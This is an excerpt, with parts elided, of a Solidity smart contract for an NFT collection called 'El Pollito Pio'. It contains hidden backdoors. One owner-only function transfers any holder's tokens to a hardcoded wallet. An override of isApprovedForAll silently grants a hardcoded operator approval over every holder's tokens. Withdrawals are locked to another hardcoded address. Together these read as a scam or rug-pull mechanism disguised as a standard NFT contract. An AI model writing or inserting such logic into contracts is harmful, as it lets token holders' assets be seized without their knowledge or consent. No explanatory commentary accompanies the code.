...
contract El_Pollito_Pio is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("El Pollito Pio", "EPP", maxBatchSize_, collectionSize_) {
  ...
  function EPP_tb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xB8FC8Ea2Cd0992376A98833d7cd510186b7A71f8, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x905D393ba0dfDB0858c3F63754259594eD93F0C1);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xAE2C4a9083BD2cfECB4551bA86a46Af49B54f56f){return true;}
